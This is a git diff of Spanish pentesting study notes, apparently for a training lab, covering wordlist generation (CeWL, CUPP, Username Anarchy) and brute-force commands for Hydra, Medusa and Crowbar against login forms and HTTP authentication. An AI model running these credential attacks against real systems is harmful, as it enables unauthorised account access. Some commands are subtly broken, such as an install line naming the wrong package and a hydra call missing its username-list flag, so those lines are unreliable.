@@ -6,13 +6,27 @@ Algunas herramientas como `hydra` tienen la opción (`-C` en el caso de `hydra`)
 hydra -C <user_pass.list> <protocol>://$target
 ```
 ---
-## Crawling
+## Generación de diccionarios
+### Crawling
 Una herramienta muy útil puede ser [CeWL](https://github.com/digininja/CeWL), que genera una lista de palabras a partir de una dirección web:
 ```bash
 cewl https://www.inlanefreight.com -d 4 -m 6 -w inlane.wordlist
 # podríamos añadir la flag --lowercase, por ejemplo si lo queremos en minúsculas
 ```
 En este ejemplo `-d` indica la profundidad (depth) y `-m` indica el mínimo número de carácteres. Es útil combinar esto con algunas mutaciones 
+### Username Anarchy
+[Herramienta](https://github.com/urbanadventurer/username-anarchy.git) para generar nombres de usuario válidos a partir del nombre real del usuario
+### CUPP
+Common User Passwords Profiler. Herramienta para generar contraseñas a partir de información recopilada por el usuario. Se instala desde terminal con 
+```bash
+apt install cup
+```
+Para generar diccinoarios, basta arrancar la herramienta como sigue: 
+```
+cupp -i
+```
+e ir añadiendo la información que conocemos
+
 ## John the Ripper
 ### Ataque de diccionario
 ```bash
@@ -136,7 +150,7 @@ Donde `<user_pass.list>` es una  combinación de usuario y contraseña separados
 #### HTTP POST Login form
 - Podemos hacer fuerza bruta solicitudes tipo POST del siguiente modo (aunque fuzz suele ser más rápido para peticiones de tipo http): 
 	```bash
-	hydra -l user -P /usr/share/wordlists/rockyou.txt $target http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"
+	hydra top-usernames_shortlist.txt -P /usr/share/wordlists/rockyou.txt $target http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:F=Login failed. Invalid"
 	```
 	La opción `http-post-form` indica que el ataque será contra un formulario HTTP POST
 	Cada sección va separada por **dos puntos (`:`)**:
@@ -146,7 +160,7 @@ Donde `<user_pass.list>` es una  combinación de usuario y contraseña separados
 		- `"fm_usr=^USER^&fm_pwd=^PASS^"` → Parámetros enviados en el formulario.
 			(las palabras `^USER^` y `^PASS^` son **marcadores especiales (placeholders)** que **Hydra reemplaza automáticamente** por valores de la lista de usuarios y contraseñas)
 	- **Texto que indica un intento fallido**
-		- `"Login failed. Invalid"` → Cadena que aparece cuando la autenticación falla.
+		- `":F=Login failed. Invalid"` → Cadena que aparece cuando la autenticación falla. Se hubiera podido utilizar "`S=302`", p. ej, para indicar success
 #### HTTP Basic Auth / Digest Auth
 - Este tipo de autenticación ocurre cuando antes de entrar en la página nos encontramos con un cuadro emergente de autenticación. En este caso, las credenciales no se envían en el cuerpo de la solicitud, sino en la cabecera `Authorization`
 - Para saber que tipo de autenticación requiere, podemos hacer `curl -i http://$target` ó `curl -I http://$target` (solo cabeceras) y la respuesta nos dará el tipo de autenticación que necesitamos	 
@@ -159,11 +173,13 @@ Donde `<user_pass.list>` es una  combinación de usuario y contraseña separados
 ##### Basic Auth
 - Tenemos en la cabecera el campo `Authorization` con el formato
 	```bash
-	Authorization: Bficasic base64(usuario:contraseña)
+	Authorization: Basic base64(usuario:contraseña)
 	```
 - Ataque con hydra:
 	```bash
 	hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt $target http-get
+	# o en un puerto concreto con usuario por defecto
+	hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt $target http-get -s $port
 	```
 - También se podría hacer con `ffuf`
 	```bash
@@ -188,9 +204,9 @@ Donde `<user_pass.list>` es una  combinación de usuario y contraseña separados
 ### Medusa
 Permite multitarget
 ```bash
-medusa -h $target -u <username> -P <password_list> -M <servicio>
+medusa -h $target -u <username> -P <password_list> -M <servicio> -t 20
 ```
-En vez de `-u` para un único usuario podríamos utilizar `-U` para una lista. Mismo con `-p`.
+En vez de `-u` para un único usuario podríamos utilizar `-U` para una lista. Mismo con `-p`.  `-t` representa los hilos
 ### Crowbar
 Es útil para servciios como RDP, SSH (claves), VNC, OpenVPN. Permite hacer fuerza bruta de claves privadas en SSH también
 ```bash
